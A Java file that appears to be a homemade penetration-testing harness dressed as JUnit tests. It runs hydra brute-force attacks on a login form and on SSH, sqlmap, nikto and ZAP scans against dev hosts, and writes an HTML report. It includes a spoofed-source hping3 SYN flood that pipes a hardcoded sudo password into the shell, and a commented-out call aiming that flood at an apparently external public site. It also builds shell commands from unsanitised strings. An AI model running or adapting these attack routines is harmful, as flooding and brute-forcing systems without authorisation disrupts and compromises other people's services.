package com.penetration.testing;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.XML;
import org.junit.jupiter.api.Test;

import java.io.*;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;

import java.util.Date;

class Tests {

    private static FileWriter file;

    public static void main(String[] args) throws IOException, InterruptedException {

    }

    public static String dosReportBloc(String result, String url) {
        String bloc1 = "          <div class=\"report\">                 <div class=\"reportName\">                     Dos attack                 </div>                 <div class=\"subReportName\">                     Dos attack report                 </div>                 <div class=\"attackDetails\">                  <span class=\"details\">Attack details:</span>                     <span>- Used tool : hping3</span>                     <span>- number of sent packets : 10000 </span>                     <span>- number of seconds between sending each packet : 10 packets peer second</span>                     <span>- packet body size : 120 bytes</span>    <span>- Website : " + url + "</span>                 </div>";
        String bloc2 = "";
        if (result.equals("true")) {
            bloc2 = "                <div class=\"failAlert\">                     Dos attack succeeded                 </div>";
        } else {
            bloc2 = "  <div class=\"successAlert\">                     Dos attack failed                 </div>";
        }
        String bloc3 = "</div>";
        return bloc1 + bloc2 + bloc3;
    }

    @Test
    public void testZero() throws IOException, InterruptedException {
        SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
        Date date = new Date();
        String cureentDate = formatter.format(date);
        System.out.println("=========================================================================================================");
        System.out.println("=========================================================================================================");
        System.out.println(cureentDate);

        JSONObject hydraReportSSH = hydraScanSSH();
        JSONObject hydraReportLogin = hydraScanLogin();
        String numberOfTriesSSH=""+hydraReportSSH.get("Number of tries");
        String numberOfTriesLogin=""+hydraReportLogin.get("Number of tries");
        String top = "<!DOCTYPE html>\n" +
                "<html lang=\"en\">\n" +
                "\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n" +
                "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n" +
                "    <title>Document</title>\n" +
                "    <link rel=\"stylesheet\" href=\"style.css\">\n" +
                "    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n" +
                "    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n" +
                "    <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">\n" +
                "\n" +
                "</head>\n" +
                "\n" +
                "<body>\n" +
                "    <nav id=\"DOSAttack\">\n" +
                "        <div class=\"reportTitle\">\n" +
                "            <span>Penetration test report</span>\n" +
                "        </div>\n" +
                "        <div class=\"reportDate\">\n" +
                "            <span>date date</span>\n" +
                "        </div>\n" +
                "    </nav>\n" +
                "    <div class=\"container\">\n" +
                "        <div class=\"sideBar\">\n" +
                "            <a class=\"scan\" href=\"#\">\n" +
                "                <div class=\"image\">\n" +
                "                    <img class=\"scanImg\" src=\"dos.png\" alt=\"\">\n" +
                "                </div>\n" +
                "                <div class=\"name\">\n" +
                "                    <span class=\"attackName\">\n" +
                "                        Dos Attack\n" +
                "                    </span>\n" +
                "                </div>\n" +
                "            </a>\n" +
                "            <a class=\"scan\" href=\"#bruteForce\">\n" +
                "                <div class=\"image\">\n" +
                "                    <img class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">\n" +
                "\n" +
                "                </div>\n" +
                "                <div class=\"name\">\n" +
                "                    <span class=\"attackName\">\n" +
                "                        Brute force attack\n" +
                "                    </span>\n" +
                "                </div>\n" +
                "\n" +
                "            </a>\n" +
                "\n" +
                "\n" +
                "            </a>\n" +
                "            <a class=\"scan\" href=\"#SQLInjection\">\n" +
                "                <div class=\"image\">\n" +
                "                    <img class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">\n" +
                "\n" +
                "                </div>\n" +
                "                <div class=\"name\">\n" +
                "                    <span class=\"attackName\">\n" +
                "                        SQL Injection Scan\n" +
                "                    </span>\n" +
                "                </div>\n" +
                "                \n" +
                "            </a>\n" +
                "            <a href=\"#niktoScan\" class=\"scan\">\n" +
                "                <div class=\"image\">\n" +
                "                    <img class=\"scanImg\" src=\"nikto.png\" alt=\"\">\n" +
                "\n" +
                "                </div>\n" +
                "                <div class=\"name\">\n" +
                "                    <span class=\"attackName\">\n" +
                "                        Nikto scan\n" +
                "                    </span>\n" +
                "                </div>\n" +
                "            </a>\n" +
                "\n" +
                "            <a class=\"scan\" href=\"#zapScan\">\n" +
                "                <div class=\"image\">\n" +
                "                    <img class=\"scanImg\" src=\"zapscan.jpg\" alt=\"\">\n" +
                "\n" +
                "                </div>\n" +
                "                <div class=\"name\">\n" +
                "                    <span class=\"attackName\">\n" +
                "                        Owasp zap scan\n" +
                "                    </span>\n" +
                "                </div>\n" +
                "            </a>\n" +
                "        </div>\n" +
                "        <div class=\"content\">";

        String end="\n" +
                "\n" +
                "        </div>\n" +
                "    </div>\n" +
                "\n" +
                "    </div>\n" +
                "\n" +
                "\n" +
                "\n" +
                "</body>\n" +
                "\n" +
                "</html>";
        String SSHResults="                <div class=\"successAlert myAlert\">\n" +
                "                    0 valide credantials\n" +
                "                </div>\n" +
                "                <div class=\"failAlert myAlert\">\n" +
                "                    <span class=\"cred\"> Credantials: </span>\n" +
                "                    <span class=\"cred\"><span class=\"big\"> - username : </span>test <span class=\"big\"> Password :</span>\n" +
                "                        pass123</span>\n" +
                "                    <span class=\"cred\"><span class=\"big\"> - username : </span>test <span class=\"big\"> Password :</span>\n" +
                "                        pass123</span>\n" +
                "\n" +
                "                </div>";
        String LoginResults="             <div class=\"successAlert myAlert\">\n" +
                "                    0 valide credantials\n" +
                "                </div>\n" +
                "                <div class=\"failAlert myAlert\">\n" +
                "                    <span class=\"cred\"> Credantials: </span>\n" +
                "                    <span class=\"cred\"><span class=\"big\"> - username : </span>test <span class=\"big\"> Password :</span>\n" +
                "                        pass123</span>\n" +
                "                    <span class=\"cred\"><span class=\"big\"> - username : </span>test <span class=\"big\"> Password :</span>\n" +
                "                        \n" +
                "                </div>";
        String bruteForceReport="            <div class=\"report\" >\n" +
                "\n" +
                "                <div class=\"reportName\">\n" +
                "                    Brute Force attack\n" +
                "                </div>\n" +
                "                <div class=\"subReportName\">\n" +
                "                    Brute Force attack report\n" +
                "                </div>\n" +
                "                <div class=\"attackDetails\">\n" +
                "                    <span class=\"details\">Attack details:</span>\n" +
                "                    <span>- <span class=\"big\">Used tool </span> : hydra</span>\n" +
                "                    <span>- <span class=\"big\">Target hostname </span> : local-tt.dev-machinestalk.com </span>\n" +
                "                    <span>- <span class=\"big\">Target SSH Address </span> : ssh://10.0.0.127:22 </span>\n" +
                "                    <span>- <span class=\"big\">Number of login tries </span> :"+numberOfTriesLogin+" </span>\n" +
                "                    <span>- <span class=\"big\">Number of SSH tries </span> : "+numberOfTriesSSH+"</span>\n" +
                "                    <span>- <span class=\"big\"> Login Usernames list </span> :href=\"Login_Usernames.txt\"Login\n" +
                "                            usernames</a></span>\n" +
                "                    <span>- <span class=\"big\">Login Passwords list </span> :<a href=\"Login_Passwords.txt\">Login passwords</a></span>\n" +
                "                    <span>- <span class=\"big\"> SSH Usernames list </span> : <a href=\"SSH_Usernames.txt\">SSH usernames</a></span>\n" +
                "                    <span>- <span class=\"big\">SSH Passwords list </span> :<a href=\"SSH_Usernames.txt\">SSH passwords</a></span>\n" +
                "\n" +
                "                </div>\n" +
                "                <span class=\"details\">Login page Result:</span>\n" +
                "\n" +
                LoginResults+
                "                <br>\n" +
                "                <span class=\"details\">SSH Result:</span>\n" +
                SSHResults+
                "            </div>";


        //            String s="[ATTEMPT] target local-iam.dev-machinestalk.com - login \"test\" - pass \"PublishThisListPlease\" - 1 of 300 [child 0] (0/0)\n";
        String path="index.html";
        PrintWriter writer = new PrintWriter(path, "UTF-8");
        writer.println(top+bruteForceReport+end);
        writer.flush();
        writer.close();
//      System.out.println(SQLMapScan("local-iam.dev-machinestalk.com/auth/","username=hello&password=hello%3A%29",1).toString());




















        //        String path="index.html";
//        PrintWriter writer = new PrintWriter(path, "UTF-8");
//        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>           <div class=\"reportDate\">             <span>"+cureentDate+"</span>         </div>      </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
//        String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
//        String blocn=" </div>     </div>     </body>  </html>";
//        writer.println(bloc1+dosResult+blocn);
//        writer.close();

        System.out.println("=========================================================================================================");
        System.out.println("=========================================================================================================");

    }

    public static JSONObject hydraScanLogin() throws IOException, InterruptedException {
        System.out.println("hydra scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "hydra -L /home/ahmed/Desktop/Login_Usernames -P /home/ahmed/Desktop/password_list.txt local-iam.dev-machinestalk.com http-post-form \"/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/login-actions/authenticate?session_code=BFX_Z-jkHIUg1eSCSzad7QwtvxP2TkGYG1AqWycxXTo&execution=11e34933-e64e-417e-88ff-8ab1ec2847c5&client_id=thingstalk&tab_id=WxWenBoK8WQ:username=^USER^&password=^PASS^:S=logout\" -vV  -o myResult -b json\n";
        ProcessBuilder pb = new ProcessBuilder(new String[]{prefix, c, terminalCommand});
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        int numberOfTries = 0;
        JSONArray results = new JSONArray();
        while ((s = br.readLine()) != null) {
            if (numberOfTries == 0) {
                if (s.contains("of ")) {
                    numberOfTries = Integer.parseInt(s.substring(s.indexOf(" of ") + 4, s.indexOf(" [")));
                }
            }

            if (s.startsWith("[80][http-post-forjm]")) {
                JSONObject rst = new JSONObject();
                rst.put("username", s.substring(s.indexOf("login: ") + 7, s.indexOf("   password:")));
                rst.put("password", s.indexOf("password: ") + ("password: ").length());
                results.put(rst);

            }
        }

        p.waitFor();
        p.destroy();
        Thread.sleep(2000);
        JSONObject obj = new JSONObject();
        obj.put("Number of tries", numberOfTries);
        obj.put("results", results);
        obj.put("success", !results.isEmpty());
        String finalShit = obj.toString(2);
        System.out.println(finalShit);
        System.out.println("----------------------");
        return obj;

    }

    public static JSONObject hydraScanSSH() throws IOException, InterruptedException {
        System.out.println("hydra scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
//        String terminalCommand ="hydra -L /home/ahmed/Desktop/Login_Usernames -P /home/ahmed/Desktop/password_list.txt local-iam.dev-machinestalk.com http-post-form \"/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/login-actions/authenticate?session_code=BFX_Z-jkHIUg1eSCSzad7QwtvxP2TkGYG1AqWycxXTo&execution=11e34933-e64e-417e-88ff-8ab1ec2847c5&client_id=thingstalk&tab_id=WxWenBoK8WQ:username=^USER^&password=^PASS^:S=logout\" -vV  -o myResult -b json\n";
        String terminalCommand = "hydra -L /home/ahmed/Desktop/SSH_Usernames -P /home/ahmed/Desktop/SSH_Passwords 10.0.0.127 -t 4 ssh\n";
        ProcessBuilder pb = new ProcessBuilder(new String[]{prefix, c, terminalCommand});
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        int numberOfTries = 0;
        boolean success = true;
        JSONArray results = new JSONArray();
        while ((s = br.readLine()) != null) {
            if (s.startsWith("[DATA] max 4")) {
                System.out.println(s.substring(s.indexOf("tasks, ") + ("tasks, ").length(), s.indexOf(" login")));


                numberOfTries = Integer.parseInt(s.substring(s.indexOf("tasks, ") + ("tasks, ").length(), s.indexOf(" login")));
            }
            if (s.startsWith("1 of 1 target")) {
                success = !(Integer.parseInt(s.substring(s.indexOf("completed, ") + ("completed, ").length(), s.indexOf(" valid"))) == 0);
            }

            System.out.println(s);
        }
        p.waitFor();
        p.destroy();
        JSONObject obj = new JSONObject();
        obj.put("Number of tries", numberOfTries);
        obj.put("success", success);
        String finalShit = obj.toString(2);
        System.out.println(finalShit);
        return obj;

    }

    public static JSONObject zapScan() throws IOException, InterruptedException {
        System.out.println("zap scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "./zap.sh -daemon -quickurl http://local-tt.dev-machinestalk.com/";

        ProcessBuilder pb = new ProcessBuilder(new String[]{prefix, c, terminalCommand});

        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        String result = "";
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        boolean save = false;
        boolean loop = true;
        while (loop) {
            s = br.readLine();
            System.out.println(s);

            if (s.contains("<?xml version")) {
                save = true;
            }
            if (s.contains("</OWASPZAPReport>")) {
                result += s;
                loop = false;
                save = false;
            }
            if (save) {
                result += s;
            }
        }
//        p.waitFor();
//        p.destroy();
        String xml = result;
        JSONObject json = XML.toJSONObject(xml);
        String jsonString = json.toString(4);
        p.destroy();
        return json;
    }

    public static JSONObject SQLMapScan(String url, String data, int level) throws IOException, InterruptedException {
        System.out.println("sqlmap is running");

        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "sqlmap -u '" + url + "' --data '" + data + "' --level " + level + " --risk " + level + " --ignore-stdin";
        System.out.println(terminalCommand);
        ProcessBuilder pb = new ProcessBuilder(
                new String[]{prefix, c, terminalCommand});

        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;

        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));

        JSONArray info = new JSONArray();
        JSONArray critical = new JSONArray();
        JSONArray warning = new JSONArray();
        Boolean injectable = true;
        while ((s = br.readLine()) != null) {

            System.out.println(s);
            if (s.contains("INFO")) {
                info.put(s.substring(s.indexOf("[INFO]") + "[INFO] ".length()));
            }
            if (s.contains("WARNING")) {
                warning.put(s.substring(s.indexOf("[WARNING]") + "[WARNING] ".length()));
            }
            if (s.contains("CRITICAL")) {
                if (s.contains("all tested parameters do not appear to be injectable")) {
                    injectable = false;
                    critical.put(s.substring(s.indexOf("[CRITICAL]") + "[CRITICAL] ".length(), s.indexOf(". Try to increase")));
                    continue;
                }
                critical.put(s.substring(s.indexOf("[CRITICAL]") + "[CRITICAL] ".length()));

            }
        }
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        obj.put("info", info);
        obj.put("critical", critical);
        obj.put("warning", warning);
        obj.put("injectable", injectable);
        p.waitFor();
        p.destroy();
        return obj;
    }

    public static JSONObject niktoScan() throws IOException, InterruptedException {
        System.out.println("nikto scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "nikto -h http://local-tt.dev-machinestalk.com";
        ProcessBuilder pb = new ProcessBuilder(
                new String[]{prefix, c, terminalCommand});
        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        JSONArray vulsArray = null;
        vulsArray = new JSONArray();
        String elapsedTime = "";
        while ((s = br.readLine()) != null) {
            if (s.startsWith("+ OSVDB")) {
                JSONObject vulJson = new JSONObject();
                String str = s.substring(s.indexOf(":") + 2);
                vulJson.put("Vulnerability name", s.substring(s.indexOf("OSVDB"), s.indexOf(":")));
                vulJson.put("Description", str.substring(str.indexOf(":") + 2));
                vulJson.put("Test link name", "http://local-tt.dev-machinestalk.com:80" + str.substring(str.indexOf("/"), str.indexOf(":")));
                vulsArray.put(vulJson);
            }
            if (s.startsWith("+ /")) {
                JSONObject vulJson = new JSONObject();
                vulJson.put("vulnerability name", "OSVDB-0");
                vulJson.put("description", s.substring(s.indexOf(":") + 2));
                vulJson.put("test link", "http://local-tt.dev-machinestalk.com:80" + s.substring(s.indexOf("/"), s.indexOf(":")));
                vulsArray.put(vulJson);
            }
            if (s.startsWith("+ End Time: ")) {
                elapsedTime = s.substring(s.indexOf("seconds") - 3, s.indexOf("seconds") + "seconds".length());
            }


        }
        obj.put("vunerabilities", vulsArray);
        obj.put("Elapsed Time", elapsedTime);
        obj2.put("Nikto scan", obj);
        p.waitFor();
        p.destroy();
        return obj;
    }

    public static JSONObject Dos(String url) throws IOException, InterruptedException {
        System.out.println("dos attack is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = " echo \"23474629\" | sudo -S -k hping3 " + url + "  -q -n -d 120 -S -p 80 --flood --rand-source";
        ProcessBuilder pb = new ProcessBuilder(new String[]{prefix, c, terminalCommand});
        File workingDirectory = new File("/home");
        System.out.println(InetAddress.getByName(url).isReachable(20));
        pb.directory(workingDirectory);
        Process p = pb.start();
        Thread.sleep(3000);
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        System.out.println(InetAddress.getByName(url).isReachable(20));
        obj2.put("result", !InetAddress.getByName(url).isReachable(20));
        obj.put("Dos attack", obj2);
        p.destroy();
        return obj2;
    }
}